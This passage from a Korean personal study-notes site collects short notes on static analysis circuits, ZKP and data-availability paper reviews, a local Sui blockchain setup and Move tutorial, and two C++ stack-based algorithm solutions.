있다.\n따라서, 실제로 에러가 발생할지 여부는 확실치 않더라도 가능성을 검출하는 것은 경우에 따라 대단히 중요해질 수 있음을 생각할 수 있다.\n2-1. 변수 값 저장\n홀수로 표시한 변수는 결국 어떠한 정보를 갖게 된다.\n정적 분석에서는 실제 계산이 없이 분석이 진행되야 하므로, Circuit 내에서는 아래와 같은 작업이 이뤄진다.\n\n값의 크기는 잊고 부호만 변수에 저장\n\n예를 들어, 아래와 같은 코드가 있다고 해보자.\nfn main() {\n\tlet p: i64 = +11;\n}\n이를 Parser를 통해 배열로 변환하면 아래와 같은 결과를 얻는다.\n{\n\t[1, 1, 22, 0] # [&#039;assign&#039;,  &#039;p&#039;,  11 * 2,  nil]\n}\n그리고 이를 Circuit 내부에서는 값의 크기인 11은 잊어버리고 그 부호인 +만 남긴다.\np = +\n2-2.  T 계산 과정\nT값은 덧셈연산을 통해 얻을 수 있다.\n따라서, Op Type이 Addition 인 경우에 rhs elem 1과 rhs elem 2의 부호정보를 확인하고 \\{+, -, T\\} 중 하나의 결과를 lhs elem에 저장하는 식으로 circuit을 구성했다.\n\n결과"},"Notes/PSE-Core-Group-Resources":{"title":"PSE Core Group Resources","links":[],"tags":["PSE_Core_Program","Cryptography"],"content":"2024년 PSE Core Group에서 활용한 자료들을 정리한 문서입니다.\nWeek 1\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nTitleTagLinkKZG  articleKZG, PCSdankradfeist.de/ethereum/2020/06/16/kate-polynomial-commitments.htmlKZG paperKZG, PCSwww.iacr.org/archive/asiacrypt2010/6477178/6477178.pdf"},"Notes/Sui-(로컬)-개발-환경-구축":{"title":"Sui (로컬) 개발 환경 구축","links":[],"tags":["SUI","Web3","개발"],"content":"Docs 읽고 한글로 정리해두려고 합니다…\nTL;DR\n\nTool, Sui 설치\nLocalnet 구동\n\nsui start with options (faucet, regensis)\n\n\nLocalnet &lt;&gt; CLI 연결\n\nsui client &lt;env&gt;\n\n\nLocalnet Account 생성\n\nsui client &lt;address&gt;\n\n\nLocalnet Faucet으로 토큰 확보\n\nsend request using curl command\n\n\n\n1. Sui 설치\n맥북이면 brew로 해도 되고, Rust가 설치되어 있으면 cargo로 해도 됩니다…\n저는 Cargo 로 설치했습니다.\nbrew install sui\ncargo install --locked --git github.com/MystenLabs/sui.git --branch testnet sui\n \nrustup update stable\n2. network 구동\n참고로 Sui는 Devnet, Testnet 이렇게 두 개로 나눠지길래 뭔가 싶었는데…\n\nblog.sui.io/sui-testnet-wave-1 에서 그렇다고 합니다…\n요약하면 Devnet은 Mysten Labs이 주도적으로 돌리고 있고, Testnet은 20 validators가 돌리고 있고의 차이…\n\n여기서는 Localnet 돌리는 것만 정리합니다.\n\n위에서 sui 가 제대로 설치됐다면 아래 스크립트를 입력해서 로컬넷을 시작할 수 있습니다.\nRUST_LOG=&quot;off,sui_node=info&quot; sui start --with-faucet --force-regenesis\n실행 결과는 아래와 같습니다.\n\n옵션은 docs에서도 잘 설명하고 있지만.. 대략 아래와 같습니다.\n\nRUST_LOG: sui_node=info 정보를 제외하고는 다 무시한다는 뜻, warning 같은거 안띄워서 깔끔\n--with-faucet: faucet 기능도 함께 시작\n--force-regenesis: 상태를 완전 재시작, 이전 상태나 이후 상태와 완전 독립적인 로컬 네트워크 시작\n\n즉, 로컬넷의 상태를 계속 유지하면서 개발을 하든… 뭔가 하고 싶으면 --force-regensis만 제거하고 위 스크립트를 실행하면 됩니다.\n2-1. 로컬넷 확인\n제대로 돌아가는지 확인하는건 curl로 request를 하나 보내보면 됩니다.\nif command -v jq &amp;&gt; /dev/null\nthen\n    echo &quot;jq 명령어가 발견되었습니다. curl 명령어를 실행합니다.&quot;\n    curl --location --request POST &#039;http://127.0.0.1:9000&#039; \\\n    --header &#039;Content-Type: application/json&#039; \\\n    --data-raw &#039;{\n      &quot;jsonrpc&quot;: &quot;2.0&quot;,\n      &quot;id&quot;: 1,\n      &quot;method&quot;: &quot;sui_getTotalTransactionBlocks&quot;,\n      &quot;params&quot;: []\n    }&#039; | jq\nelse\n    echo &quot;jq 명령어가 설치되어 있지 않습니다.&quot;\nfi\n아래와 같이 확인할 수 있습니다.\n\n3. 네트워크(로컬넷)에 Sui CLI 연결\nSui CLI를 처음 사용할 때 config file 을 만들게 됩니다.\n\n위와 같이 sui client를 입력하고 y, &lt;ENTER&gt;, 0 해주면 됩니다.\n아래 스크립트를 입력해 로컬넷을 사용하도록 설정합니다.\nsui client new-env --alias local --rpc http://127.0.0.1:9000\n옵션에 대한 설명은 다음과 같습니다.\n\nsui client new-env: 새로운 네트워크 환경을 등록합니다.\n--alias local: local이라는 이름으로 새로운 환경을 등록합니다.\n--rpc http://127.0.0.1:9000: rpc endpoint 정보를 등록합니다.\n\n즉, local이라는 이름으로 http://127.0.0.1:9000 인 로컬넷 환경을 새로 하나 만드는 명령어입니다.\n새로 생성한 환경으로 switch 해줍니다.\nsui client switch --env local\n참고로 여기서 사용한 switch는 --env 뿐만 아니라 --address도 가능합니다.\n자세한 사항은 sui client switch --help로 확인할 수 있습니다.\nsui client envs\n위 명령어를 입력하면 현재 저장된 환경들을 모두 확인할 수 있습니다.\n\n4. Active address 확인하기\n그냥 주어진 address 를 사용해도 되지만, 기왕이면 직접 만든 address를 사용해보는게 좋다고 생각합니다.\n# sui client new-address ed25519 &lt;nickname&gt;\nsui client new-address ed25519 p4nn4\n\n위 recoveryPhrase를 이용해 wallet extension에서도 계정을 import 해올 수 있습니다 (물론 localnet으로 변경해주셔야 합니다…)\n\n참고로 계정에 관한 정보는 앞서 생성한 config file 위치에 가면 확인할 수 있습니다.\n보통 홈 디렉토리 (~/)에 .sui 폴더로 존재합니다.\n\n\n5. Faucet 으로 토큰 얻기\n앞서 로컬넷을 실행할 때 --with-faucet 옵션을 넣었으므로 간단히 아래 스크립트를 입력하여 토큰을 받아 올 수 있습니다.\n# curl --location --request POST &#039;http://127.0.0.1:9123/gas&#039; \\\n# --header &#039;Content-Type: application/json&#039; \\\n# --data-raw &#039;{\n#     &quot;FixedAmountRequest&quot;: {\n#         &quot;recipient&quot;: &quot;&lt;YOUR SUI ADDRESS&gt;&quot;\n#     }\n# }&#039;\n \ncurl --location --request POST &#039;http://127.0.0.1:9123/gas&#039; \\\n--header &#039;Content-Type: application/json&#039; \\\n--data-raw &#039;{\n    &quot;FixedAmountRequest&quot;: {\n        &quot;recipient&quot;: &quot;0xb3087987a1769fa853f5d2bddead6414ca4b0f7f17c1f8932937ef7410dcbbc5&quot;\n    }\n}&#039;\n\n1,000 sui 를 받아왔습니다…\n\n이 정도 하면 개발 환경 구축은 된 것 같습니다.\n다음은 move언어를 이용해 smart contract에 해당하는 프로그램 개발을 다뤄봅니다."},"Notes/zk-regex-analysis":{"title":"zk-Regex 분석","links":[],"tags":[],"content":""},"PS/BOJ/📕(BOJ)2493":{"title":"📕(BOJ)2493","links":[],"tags":["Algorithm","PS"],"content":"문제\n[링크]\n\nN 개의 탑이 일렬로 나란히 서있는 모습을 상상해보자.\ni 번째 위치의 탑이 왼쪽을 향해 신호를 쏠 때, i 번째보다 높이가 높은 탑에서 신호를 수신한다고 한다.\n이 때, 각각의 i 번째 탑이 쏜 신호를 수신하는 탑의 번호를 모두 출력하는 문제이다.\n\n\n풀이\n\n\n이 문제에서는 시간초과를 해결하는 하나의 방법에 관한 아이디어를 익힐 수 있었다.\n\n\n처음에는 이 문제를 해결하는 접근법을 아래와 같이 생각했다.\n\n\n\n\n\n우선 N 개의 탑의 높이를 모두 Stack에 저장한다.\n\n\nO(N^2) 의 시간복잡도로 답을 구한다.\n\n\n\n\n\n여기서, 첫 번째 생각인 일단 전부 저장한다를 지우는 것이 핵심이었다.\n\n\n즉, Stack 에 값을 넣을 때 문제에서 요구하는 작업을 수행할 수 있다면 불필요한 시간 낭비를 줄일 수 있다는 것이다.\n\n\nStack 에 값을 넣을 떄 생각해 볼 조건들은 아래와 같다.\n\n\n\n\nStack에 값이 처음 들어가는가 (== Stack이 비어있는가)\n\n\n신호를 수신할 탑이 없으므로, 출력은 0 이다.\n새로운 값이 수신탑이 될 수 있으므로, push() 한다.\n\n\n\n\nStack의 top에 있는 값이 새로운 값보다 큰가\n\n\ntop이 수신탑이 될 수 있으므로, 출력은 *top이다.\n새로운 값이 수신탑이 될 수 있으므로, push() 한다.\n\n\n\n\nStack의 top에 있는 값이 새로운 값보다 작은가\n\n\ntop이 수신탑이 될 수 없으므로, 과감히 pop() 한다.\n이 때, 만약 pop() 한 후의 top도 수신탑이 될 수 없다면 연속적으로 pop()한다.\n\npop() 하는 도중, Stack 이 empty가 된다면 1번 을 행한다.\npop() 하는 도중, top이 수신탑이 될 수 있다면, 2번을 행한다.\n\n\n\n\n\n코드\n\n  \n  코드 확인 \n  \n  \n#include &lt;iostream&gt;\n#include &lt;stack&gt;\n#include &lt;algorithm&gt;\n \nusing namespace std;\n \nstack&lt;pair&lt;int, int&gt;&gt; towers;\n \nint main() {\n  ios::sync_with_stdio(false);\n  cin.tie(0);\n \n  int n;\n  cin &gt;&gt; n;\n \n  for(int i = 1; i &lt;= n; i++) {\n    int tower_height;\n    cin &gt;&gt; tower_height;\n \n    if (towers.empty()) {\n      cout &lt;&lt; 0 &lt;&lt; &#039; &#039;;\n      towers.push(make_pair(i, tower_height));\n    } else {\n      while (!towers.empty() &amp;&amp; towers.top().second &lt; tower_height) {\n        towers.pop();\n      }\n      if (towers.empty()) {\n        cout &lt;&lt; 0 &lt;&lt; &#039; &#039;;\n        towers.push(make_pair(i, tower_height));\n      } else {\n        cout &lt;&lt; towers.top().first &lt;&lt; &#039; &#039;;\n        towers.push(make_pair(i, tower_height));\n      }\n    }\n \n  }\n  cout &lt;&lt; &#039;\\n&#039;;\n \n \n  return 0;\n}\n \n  \n"},"PS/BOJ/📕(BOJ)6198":{"title":"📕(BOJ)6198","links":["PS/BOJ/📕(BOJ)2493"],"tags":["Algorithm","PS"],"content":"문제\n[링크]\n\nN 개의 빌딩이 일렬로 나란히 서있는 모습을 상상해보자.\ni 번째 위치의 빌딩에서 오른쪽 방향을 바라볼 때, i 번째 보다 높이가 낮은 빌딩들의 옥상을 볼 수 있다.\n이 때, 볼 수 있는 옥상의 총 갯수를 구하는 문제이다.\n\n\n풀이\n\n\n어제 해결한 📕(BOJ)2493 문제의 아이디어를 이용했다.\n\n\n2493 문제는 왼쪽 방향을 이용하는 문제이기 때문에, 입력값을 한 번 뒤집어 주는 작업을 더했다.\n\n\n이후, 빌딩 간에 U 자 모양이 되는 구간의 거리 - 1 값이 관찰되는 옥상의 개수와 같기 때문에 총합을 구하여 문제를 해결했다.\n\n\n\n\nex) 10 3 7 4 12에서 U자 모양은 (10) 3 7 4 (12)이고, 둘 사이의 거리 4 - 1 == 보이는 옥상의 개수 3 이다.\n\n\n\n또, 스택이 비어있다면 현재 빌딩의 오른쪽 방향의 모든 옥상을 볼 수 있다는 의미이므로 index 값을 더했다.\n\n\n코드\n\n  \n  코드 확인 \n  \n  \n#include &lt;iostream&gt;\n#include &lt;stack&gt;\n \nusing namespace std;\nusing ll=long long;\n \nstack&lt;pair&lt;ll, ll&gt;&gt; st;\nstack&lt;ll&gt; rev;\n \nll sum;\n \nint main() {\n  ios::sync_with_stdio(false);\n  cin.tie(0);\n \n  int n;\n  cin &gt;&gt; n;\n \n  for (int i = 0; i &lt; n; i++) {\n    ll height;\n    cin &gt;&gt; height;\n \n    rev.push(height);\n \n  }\n \n  for(ll i = 0; i &lt; n &amp;&amp; !rev.empty(); i++) {\n    ll height = rev.top();\n    rev.pop();\n \n    if (st.empty()) {\n      // cout &lt;&lt; &quot;[+1] h: &quot; &lt;&lt; height &lt;&lt; &quot;, add: &quot;  &lt;&lt; i &lt;&lt; endl;\n \n      // sum += 0;\n \n      st.push(make_pair(i, height));\n    } else {\n      while (!st.empty() &amp;&amp; st.top().second &lt; height) {\n        st.pop();\n      }\n \n      if (st.empty()) {\n        // cout &lt;&lt; &quot;[+2] h: &quot; &lt;&lt; height &lt;&lt; &quot;, add: &quot;  &lt;&lt; i &lt;&lt; endl;\n \n        sum += i;\n \n        st.push(make_pair(i, height));\n      } else {\n        // cout &lt;&lt; &quot;[+3] h: &quot; &lt;&lt; height &lt;&lt; &quot;, add: &quot;  &lt;&lt; i - st.top().first - 1&lt;&lt; endl;\n \n        sum += (i - st.top().first - 1);\n \n        st.push(make_pair(i, height));\n      }\n    }\n \n  }\n  cout &lt;&lt; sum &lt;&lt; &#039;\\n&#039;;\n \n  return 0;\n}\n  \n\n\n참고\n\n\n문제를 해결하고 나서 다른 분들의 코드를 살펴보았다.\n\n\n[Github]의 코드를 확인했는데, 적잖이 충격적이었다.\n\n\n위 코드의 아이디어를 내 말로 정리해두자면 아래와 같다.\n\n\n\n\nStack의 상태를 항상 가장 높은 빌딩 부터 내림차순으로 나란히 정렬된 모습을 유지하기\n\n\n\n\n문제를 풀 때, 가장 많이 고민했던 부분은 10 3 7 4 12 상태에서, 10이 3개의 옥상(3 7 4)을 볼 수 있음을 어떻게 저장하는가였다.\n\n\n위 아이디어를 이용하면, 오른쪽으로 향하는 화살표가 중첩되는 이미지를 생각해볼 수 있다.\n\n\n즉, iteration 을 돌면서 하나 하나 검사할 필요 없이 한 번에 해결이 가능하다.\n\n"},"Paper-Review/Data-Availability-Sampling":{"title":"Foundations of Data Availability Sampling","links":[],"tags":["Erasure_Codes"],"content":"Abstract\n더욱 확장성을 가진 블록체인을 만드는 방향으로 나가면서, 몇년 전부터 DAS(Data Availability Sampling)이라는 접근법이 알려지기 시작했습니다.\n심지어 이더리움과 같은 거대한 블록체인도 확장성 향상을 위해 결국 DAS를 배포할 계획을 하고 있습니다.\n간단히 말해, DAS는 임의의 블록체인 참여자가 데이터를 다운로드하지 않고도 해당 데이터에 대한 ‘가용성’을 보장받을 수 있는 기술입니다.\nDAS가 받고 있는 현저한 실용적 관심에도 불구하고, 현재까지는 어떠한 공식적인 정의나 보안적 정의, 그리고 보안적 증명이 없는 실정입니다.\n결국엔 실생활에 넓게 사용될 암호학 프리미티브로써 이는 상당히 아쉬운 상황이 아닐 수 없습니다."},"Paper-Review/FRIDA":{"title":"FRIDA2024","links":["Paper-Review/Data-Availability-Sampling"],"tags":["Cryptography"],"content":"Abstract\n이더리움과 같은 블록체인이 꾸준히 성장함에 따라, 제한된 자원을 사용하는 클라이언트들은 더 이상 전체 데이터를 저장할 수 없게 되었습니다.\nLight node를 사용하면, 블록체인을 사용하면서도 전체적으로 좋은 상태인지 검증하는 작업은 제외한 형태로, 헤더만 저장할 수 있습니다.\n하지만 결국 Light node도 블록 content를 필요로 할 수 있기 때문에, 이론상 ‘가용성’이 있음이 보장될 필요가 있습니다.\nBassam 등에 의해 소개된 Data Availability Sampling은 Light node가 실제 데이터를 다운로드 하지 않고도 ‘가용성’을 검사할 수 있도록 하는 프로세스 입니다.\n최근 연구 결과에 따르면, Hall-Andersen, Simkin, Wagner는 이에 대한 공식적인 정의(formal definition)와 여러 구조에 대한 분석을 내놓았습니다.\n이들의 작업은 Data Availability Sampling을 위한 형식적인 토대를 철저히 마련하지만, 분석된 구조들이 ‘엄청나게 비싸거나’, ‘trusted setup을 사용하거나’, ‘데이터 크기의 제곱근에 해당하는 다운로드 복잡성을 light node에게 전가한다’는 문제점도 보입니다.\n이 논문에서는 trusted setup이 없고, polylogarithmic 오버헤드만을 갖는 efficient Data Availability Sampling 스킴을 제시하여, 의미심장한 발전을 제시합니다.\n결과로써 이 논문에서는 IOPPs(Interactive Oracle Proofs of Proximity)와의 기발한 연결을 발견했음을 보입니다.\n특히, 임의의 IOPP가 추가적인 consistency 조건을 만족할 경우 erasure code commitment로 치환되고 Hall-andersen, Simkin, Wagner의 컴파일러를 활용해 Data Availability Sampling으로까지 치환됨을 증명합니다.\n이 새로운 연결은 향후 연구될 IOPP로부터 DAS가 효용을 얻을 수 있도록 합니다.\n마지막으로, 널리 사용되는 FRI IOPP가 상기한 조건을 만족함을 보이고 이를 DAS로 치환한 결과가 State-of-the-art 보다 훨씬 좋은 퍼포먼스를 냄을 보입니다.\n\n1. Introduction"},"Paper-Review/Orion":{"title":"Orion2022","links":["Data-Structure/bipartite-graph"],"tags":["ZKP","Cryptography"],"content":"Abstract\n영지식 증명은 다양한 실제 응용이 가능한 강력한 암호학적 프리미티브입니다. 그러나 기존의 영지식 증명 스킴들은 증명 크기가 간결한 대신, 증명 생성 시간에서 큰 오버헤드를 겪고 있어, 실용적인 효율성과 확장성에 한계가 있었습니다. 이러한 문제를 해결하기 위해 본 논문에서는 Orion이라는 새로운 영지식 증명 시스템을 제안했습니다.\nOrion은 필드 연산과 해시 함수에 대해 O(N)의 증명 생성 시간을 달성하고, 증명 크기는 O(\\log^2 N)으로 유지하면서도, 구체적인 효율성을 자랑합니다. 논문에서 구현된 결과에 따르면, 220개의 곱셈 게이트로 이루어진 회로에 대해 3.09초의 증명 생성 시간과 1.5MB의 증명 크기를 보여주었으며, 이는 현존하는 모든 간결한 증명 시스템 중에서 가장 빠른 시간입니다. 또한 증명 크기는 최근 제안된 다른 스킴에 비해 한 자릿수 작음을 확인했습니다.\nOrion의 이러한 효율성은 두 가지 주요 기술 덕분입니다. 첫째, 무작위 이분 그래프가 손실 없는 확장 그래프인지 여부를 검사하는 새로운 알고리즘을 제안하여, 손실 없는 확장 그래프를 매우 높은 확률로 샘플링할 수 있게 했습니다. 이 기술은 기존 영지식 증명 스킴의 효율성과 보안성을 크게 향상시킬 수 있습니다. 둘째, code switching이라는 효율적인 증명 구성 스킴을 개발하여, 증명 크기를 계산 크기에 대해 제곱근에서 polylogarithmic으로 감소시켰습니다. 이 스킴은 증명 생성 시간에 아주 작은 오버헤드만을 발생시키는 효율성을 보장합니다.\n\n1. Introduction\n영지식 증명 (ZKP)은 Prover로 하여금 명제에 관한 어떠한 추가 정보도 제공하지 않으면서 Verifier에게 자신의 명제가 유효함을 납득시킬 수 있도록 합니다.\nGoldwasser, Micali, Rackoff (GMR89)의 세미나 논문에서 처음 소개된 이후, ZKP는 순수한 이론적 흥미로부터 구체적으로 효율적인 암호 프리미티브로까지 진화해오며 실용적인 실제 응용들을 이끌어 왔습니다.\n대부분은 블록체인과 암호화폐 업계에서 프라이버시(Zcash)와 확장성의 향상(zkRollup)을 얻기 위해 사용되어 왔습니다.\n최근에는 zero-knowledge machine learning, zero-knowledge program analysis, zero-knowledge middle box와 같은 형태로도 응용되고 있습니다.\nZKP에 관해 세 가지 주요 효율성 측정 지표가 있습니다.\n\nProver Time: Prover가 \\pi \\; (proof) 를 생성하는데 드는 오버헤드\nProof Size: Prover와 Verifier 간의 전체 소통량\nVerifier Time: Verifier가 \\pi 를 검증하는데 드는 시간\n\n근래의 많은 발전들에도 불구하고 ZKP의 효율성은 다양한 응용에 활용되기에 충분히 좋지는 않습니다.\n특히, Prover Time은 ZKP 스킴이 큰 명제(large statement)으로 확장되는 것을 막고 있는 주요 병목입니다.\n[GLS+]에서도 지적하듯이 N개의 게이트로 이루어진 산술회로(arithmetic circuit)로 모델링되는 주장(명제, statement)을 증명하기 위해서, 현존하는 ‘간결한(succinct)’ 크기의 증명을 갖는 ZKP 스킴은 다음 두 가지 방식 중 하나를 사용합니다.\n\n고속 푸리에 변환(FFT)\n\n리드-솔로몬 코드 인코딩(Reed-Solomon Code Encoding) 또는 다항식 보간법(polynomial interpolation)을 수행하기 위해 사용됩니다.\nField addition, multiplication 연산에 대해 O(N \\log N) 시간 복잡도를 갖습니다.\n\n\n다중 스칼라 지수화(Multi-Scalar Exponentiation)\n\n이 방법은 이산 로그 가정(discrete-logarithm assumption)이나 이중 선형 사상(bilinear map)에 기반하며, 크기 O(N)의 벡터를 처리합니다.\nField Multiplication 연산에 대해 O(N \\log | \\mathbb{F} |) 의 시간 복잡도를 가지며, 이 때 | \\mathbb{F} | 는 Finite Field의 크기를 의미합니다.\nPippenger 알고리즘 (Pip)을 사용하면 시간 복잡도를 O(N \\log | \\mathbb{F} | / \\log N)으로 개선할 수는 있지만, 보안성을 보장하기 위해 \\log | \\mathbb{F} | = \\omega (\\log N) 을 만족해야 합니다. 따라서, 최소한 \\log N 보다는 빠르게 증가한다는 의미이므로 충분히 큰 | \\mathbb{F} | 가 필요함을 의미합니다. 즉, 여전히 초선형(super-scalar) 입니다.\n\n\n\n이 두 연산은 결국 prover time에서 이론적으로나 실제로나 주된 비용을 차지하게 됩니다.\n간결한 증명크기에 대해 이렇게 증명을 생성하는 것과 달리, 문헌에서 설명하는 유일한 예외에는 [BCG+17], [BCG20], [BCL22], [GLS+]에서 제시된 스킴들이 있습니다.\n\n\nProver Time\n\n[BCG+17]: 선형 시간으로 인코딩할 수 있는 오류 수정 코드(linear-time encodable error-correcting code)를 사용하여,\n필드 연산에서 O(N)의 시간을 달성 (ZKP에서 최초로 linear time을 달성).\n[BCG20]: [BCG+17]과 동일한 O(N) prover time 유지.\n[BCL22]: [BCG20]과 동일한 O(N) prover time 유지.\n[GLS+]: 랜덤화된 구성 방식을 통해 선형 시간 인코딩이 가능한 코드를 활용하여 O(N)의 prover time을 유지.\n\n\n\nProof Size\n\n[BCG+17]: O(\\sqrt{N}) (linear-time 인코딩을 통해 기존 대비 효율성 향상)\n[BCG20]: 텐서 코드를 통해 임의의 상수 c에 대해 O(N^{1/c})로 개선\n[BCL22]: PCP(Probabilistic Checkable Proof)와의 generic proof composition을 통해 \\text{polylog}(N)까지 향상\n[GLS+]: 랜덤화된 구성 방식을 통해 선형 시간 인코딩을 사용했으나, O(\\sqrt{N})에 머무름\n\n\n\nSecurity\n\n[GLS+]: 보안 보장(soundness error)이 회로 크기에 대해 역다항식(inverse polynomial) 수준으로, 이는 충분히 작지 않음\n\n\n\n따라서, ZKP 스킴에 관해 아래의 의문을 해결할 여지가 여전히 남아있습니다.\n\nProver Time이 O(N), Proof Size가 \\text{polylog}(N)인 구체적이고 효율적인 ZKP 스킴을 구축할 수 있는가?\n\n\n1.1 Our Contribution\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nSchemeProver timeProof sizeVerifier timeSoundness errorConcrete efficiency[BCG+17]O(N)O(\\sqrt{N})O(N)\\text{negl}(N)✗[BCG20]O(N)O(N^{1/c})O(N)\\text{negl}(N)✗[BCL22]O(N)\\text{polylog}(N)O(N)\\text{negl}(N)✗[GLS+]O(N)O(\\sqrt{N})O(N)O\\left(\\frac{1}{\\text{poly}(N)}\\right)✔   Orion  O(N)O(\\log^2 N)O(N)\\text{negl}(N)✔\n\n\n본 논문에서는 위 질문에 대한 답으로 새로운 ZKP 스킴을 제안합니다.\n구체적으로 본 논문에서 제시한 스킴은 아래의 특징을 갖습니다.\n\n본 논문에서는 압도적인 확률로 constant relative distance를 갖는 임의 구조의 linear-time encodable code를 제안합니다.\n이러한 code는 linear-time ZKP Schemes ([BCG+17], [BCG20], [BCL22], [GLS+])에서 모두 사용되었으므로, 본 논문에서의 새로운 construction도 이러한 효율성을 개선합니다.\n핵심적인 technique은 small set expansion problem을 기반으로 임의의 Graph가 good expander graph인지 검사하는 것입니다.\n본 논문에서는 O(\\log^2 N) 크기의 Proof Size를 효율적으로 얻는 새로운 reduction을 제시합니다.\n이 기술은 [RR20]에서 제안된 “code switching”이라는 이름의 Proof Composition (증명 합성) 입니다.\n본 논문에서는 linear-time encodable code의 encoding circuit을 이용해,\nProver Time에 적은 오버헤드를 일으키며 [BCG20, GLS+]의 Proof Size를 O(\\sqrt{N}) 에서 O(\\log^2N) 으로까지 reduce하는 효율적인 예시를 개발했습니다.\n마지막으로, 본 논문에서는 Orion 이라는 이름의 새로운 ZKP Scheme을 개발하고 이를 실험적으로 평가했습니다.\n2^{20}개의 Gate로 이루어진 Circuit (R1CS에서 2^{20}개의 constraint로 구성)에서 아래와 같은 측정 결과를 얻었습니다.\nOrion은 현존하는 ZKP Scheme 중에서 가장 빠른 Prover Time을 가집니다.\nProof Size도 [GLS+]보다 6.5배 더 작습니다.\n또한, 이 Scheme은 그럴듯하게 Post-Quantum도 만족하며 Fiat-shamir를 활용하면 Non-interactive하게도 만들 수 있습니다.\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nNameValueProver Time3.09sProof Size1.5MBVerifier Time70ms\n\n"},"index":{"title":"Welcome to Quartz","links":["Ethernaut/Ethernaut,-로컬-풀이-환경구축"],"tags":[],"content":"Since 2024…\n빈수레라 요란합니다.\n\nEthernaut 풀이\nEthernaut, 로컬 풀이 환경구축"},"Notes/Sui-(로컬)-DApp-개발-연습":{"title":"Sui (로컬) DApp 개발 연습","links":["Sui,-DApp-Frontend"],"tags":["SUI","개발","Web3"],"content":"우선 아래와 같이 입력해 새로운 프로젝트를 생성합니다.\nsui move new my_frist_package\n생성된 폴더인 my_first_package로 가보면 manifest file 인 Move.toml과 소스코드가 있는 sources 디렉토리가 있습니다.\n\n1. Package 정의하기\nsources/my_first_package.move 는 사실 아무런 기능을 하지 않습니다.\nmove로 작성된 소스코드는 module 을 정의해야 합니다.\nDocs에서 제공하는 예시 코드를 이미 생성된 sources/my_first_package.move 소스 코드의 바로 밑에 복붙하면 됩니다. 헷갈릴 수 있으므로 전체 코드를 아래에 첨부합니다.\n/*\n/// Module: my_first_package\nmodule my_first_package::my_first_package;\n*/\n \nmodule my_first_package::example {\n \n    // Part 1: These imports are provided by default\n    // use sui::object::{Self, UID};\n    // use sui::transfer;\n    // use sui::tx_context::{Self, TxContext};\n \n    // Part 2: struct definitions\n    public struct Sword has key, store {\n        id: UID,\n        magic: u64,\n        strength: u64,\n    }\n \n    public struct Forge has key {\n        id: UID,\n        swords_created: u64,\n    }\n \n    // Part 3: Module initializer to be executed when this module is published\n    fun init(ctx: &amp;mut TxContext) {\n        let admin = Forge {\n            id: object::new(ctx),\n            swords_created: 0,\n        };\n \n        // Transfer the forge object to the module/package publisher\n        transfer::transfer(admin, ctx.sender());\n    }\n \n    // Part 4: Accessors required to read the struct fields\n    public fun magic(self: &amp;Sword): u64 {\n        self.magic\n    }\n \n    public fun strength(self: &amp;Sword): u64 {\n        self.strength\n    }\n \n    public fun swords_created(self: &amp;Forge): u64 {\n        self.swords_created\n    }\n \n    // Part 5: Public/entry functions (introduced later in the tutorial)\n    \n    // Part 6: Tests\n}\nRust와 상당히 비슷하기 때문에 익숙하다면 읽기 수월합니다..\n위 내용을 기존의 my_first_package.move 에 복붙합니다.\n2. Build your package\n아래 명령어를 입력해서 build를 진행합니다.\nsui move build\n\n인터넷 문제가 없다면 위 그림과 같이 Build 할 수 있습니다.\nbuild 폴더를 살펴보면 bytecode로 컴파일된 example.mv 파일을 확인할 수 있습니다.\n(사진은 xxd로 보기 예쁘게 변환해 둔 결과입니다)\n\n3. Testing\n개발에 있어서 testing이 빠질 수 없습니다.\ntests/ 폴더는 일단 신경쓰지 말고 위에서 수정한 sources/my_first_package.move 를 계속 수정합니다. 헷갈릴 수 있으므로 전체 코드를 첨부해두겠습니다.\n/*\n/// Module: my_first_package\nmodule my_first_package::my_first_package;\n*/\n \nmodule my_first_package::example {\n \n    // Part 1: These imports are provided by default\n    // use sui::object::{Self, UID};\n    // use sui::transfer;\n    // use sui::tx_context::{Self, TxContext};\n \n    // Part 2: struct definitions\n    public struct Sword has key, store {\n        id: UID,\n        magic: u64,\n        strength: u64,\n    }\n \n    public struct Forge has key {\n        id: UID,\n        swords_created: u64,\n    }\n \n    // Part 3: Module initializer to be executed when this module is published\n    fun init(ctx: &amp;mut TxContext) {\n        let admin = Forge {\n            id: object::new(ctx),\n            swords_created: 0,\n        };\n \n        // Transfer the forge object to the module/package publisher\n        transfer::transfer(admin, ctx.sender());\n    }\n \n    // Part 4: Accessors required to read the struct fields\n    public fun magic(self: &amp;Sword): u64 {\n        self.magic\n    }\n \n    public fun strength(self: &amp;Sword): u64 {\n        self.strength\n    }\n \n    public fun swords_created(self: &amp;Forge): u64 {\n        self.swords_created\n    }\n \n    // Part 5: Public/entry functions (introduced later in the tutorial)\n    \n    // Part 6: Tests\n \n \n    #[test]\n    fun test_sword_create() {\n        // Create a dummy TxContext for testing\n        let mut ctx = tx_context::dummy();\n \n        // Create a sword\n        let sword = Sword {\n            id: object::new(&amp;mut ctx),\n            magic: 42,\n            strength: 7,\n        };\n \n        // Check if accessor functions return correct values\n        assert!(sword.magic() == 42 &amp;&amp; sword.strength() == 7, 1);\n \n        let dummy_address = @0xCAFE;\n        transfer::public_transfer(sword, dummy_address);\n    }\n}\n그리고 아래 명령어를 입력하면 됩니다.\nsui move test\n\n3.  Sui-specific testing\nSui 에서 제공하는 test_scenario 모듈을 사용하면 Sui를 사용하는 맥락에서의 testing도 가능합니다.\n우선 sword를 생성하는 함수를 하나 추가합니다.\npublic fun sword_create(magic: u64, strength: u64, ctx: &amp;mut TxContext): Sword {\n    Sword {\n        id: object::new(ctx),\n        magic: magic,\n        strength: strength,\n    }\n}\n그리고 아래 test code를 추가합니다.\n    #[test]\n    fun test_sword_transactions() {\n        use sui::test_scenario;\n \n        // Create test addresses representing users\n        let initial_owner = @0xCAFE;\n        let final_owner = @0xFACE;\n \n        // First transaction executed by initial owner to create the sword\n        let mut scenario = test_scenario::begin(initial_owner);\n        {\n            // Create the sword and transfer it to the initial owner\n            let sword = sword_create(42, 7, scenario.ctx());\n            transfer::public_transfer(sword, initial_owner);\n        };\n \n        // Second transaction executed by the initial sword owner\n        scenario.next_tx(initial_owner);\n        {\n            // Extract the sword owned by the initial owner\n            let sword = scenario.take_from_sender&lt;Sword&gt;();\n            // Transfer the sword 